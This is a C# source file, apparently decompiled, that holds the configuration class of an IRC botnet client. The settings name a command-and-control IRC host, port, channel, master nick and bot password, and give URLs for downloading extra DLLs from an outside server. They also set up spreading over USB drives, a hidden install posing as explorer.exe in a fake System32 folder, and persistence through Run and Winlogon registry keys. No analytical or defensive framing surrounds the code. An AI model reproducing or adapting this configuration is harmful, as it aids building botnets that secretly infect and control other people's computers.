namespace TBOT;

internal class Config
{
	public const string taskmngrDes = "Windows Explorer";

	public static string dll = "http://dengesizler.org/DarkFire.dll";

	public static string msndll = "http://dengesizler.org/MessengerAPI.dll";

	public static string botPassword = "d3ng3sizim";

	public static string botRandom = botInfo.randID();

	public static string[] ircMasters = new string[1] { "d3ngsz" };

	public static string ircCommandPrefix = "_";

	public static string ircNick = "[" + botInfo.getOS() + "|" + botInfo.countryCode(botInfo.codeType.Short) + "|" + botRandom + "]";

	public static string newNick = "{YENI}" + ircNick;

	public static string usbNick = "{USB}" + ircNick;

	public static string ircHost = "dht.secrethacker.net";

	public static int ircPort = 1905;

	public static string ircPass = "";

	public static string ircChannel = "#deng0";

	public static string ircChannelPass = "";

	public static string usbFile = "setup.exe";

	public static string installPath = "%mainDrive%:\\Windows\\System32\\mswindows\\";

	public static string installFile = "explorer.exe";

	public static bool installFileHidden = true;

	public static bool installFileSystem = false;

	public static string mutex = "qafourezzzzasdzajshdjksahdjksahjdkhjkhajhdjkashdkjsahsdxcd";

	public static string regInfoPath = "Software\\Microsoft\\Security";

	public static string startupName = "Explorer";

	public static string[] startupKeys = new string[2] { "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices" };

	public static string[] infectedDirsCU = new string[4] { "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Software\\Microsoft\\OLE" };

	public static string[] infectedDirLM = new string[5] { "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run" };

	public static string[] infectedNames = new string[9] { "HKLM", "HKCU", "startup", "windows", "update", "machine", "reealtek", "{", "microsoft" };

	public static string[] badProc = new string[2] { "rundll32", "winlog.exe" };
}
